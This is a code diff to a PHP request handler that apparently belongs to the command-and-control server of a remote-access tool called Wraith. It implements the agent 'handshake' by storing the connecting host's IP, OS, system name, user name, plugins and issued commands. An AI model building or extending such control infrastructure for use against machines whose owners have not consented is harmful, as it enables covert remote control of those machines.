@@ -46,7 +46,29 @@ class Handler_proto_v_0 {
             // Wraith is logging in
             if ($this->c_data["req_type"] === "handshake") {
 
-                // TODO
+                // Ensure that the required fields are present in the request
+
+
+                // Create a database entry for the Wraith
+                db_add_wraiths([[
+                    "AssignedID" => uniqid(),
+                    "Fingerprint" => "",
+                    "ReportedIP" => "",
+                    "ConnectingIP" => get_client_ip(),
+                    "OSType" => "",
+                    "SystemName" => "",
+                    "HostUserName" => "",
+                    "WraithVersion" => "",
+                    "ActivePlugins" => "",
+                    "ConnectionTime" => time(),
+                    "LastHeartbeatTime" => time(),
+                    "IssuedCommands" => json_encode([]),
+                ]]);
+
+                $this->response["status"] = "SUCCESS";
+                $this->response["message"] = "handshake successful";
+
+                return;
 
             // Wraith is sending heartbeat
             } else if ($this->c_data["req_type"] === "heartbeat") {
